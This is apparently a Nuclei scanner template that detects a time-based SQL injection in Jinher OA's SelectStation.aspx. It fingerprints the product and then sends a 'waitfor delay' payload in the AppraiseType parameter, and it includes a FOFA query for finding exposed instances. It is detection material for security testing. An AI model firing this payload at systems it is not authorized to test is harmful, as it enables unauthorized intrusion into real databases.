id: poc-yaml-jinher-selectstation-aspx-sqli
info:
  name: 金和OA SelectStation.aspx SQL Injection
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    fingerprint: 金和OA
    fofa: app="金和网络-金和OA"

variables:
  t1: '{{rand_int(5,10)}}'
  t2: '{{to_number(t1) + 2}}'

http:
  - raw:
      - |
        GET /C6/Jhsoft.Web.login/PassWordSlideFull.aspx HTTP/1.1
        Host: {{Hostname}}
    matchers:
      - type: word
        words:
          - "JHSoft"
        part: body

  - raw:
      - |
        GET /c6/Jhsoft.Web.Appraise/SelectStation.aspx/?AppraiseType=1')waitfor+delay'0:0:{{t1}}'-- HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "选择岗位"
          - "请选择岗位"
        part: body
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
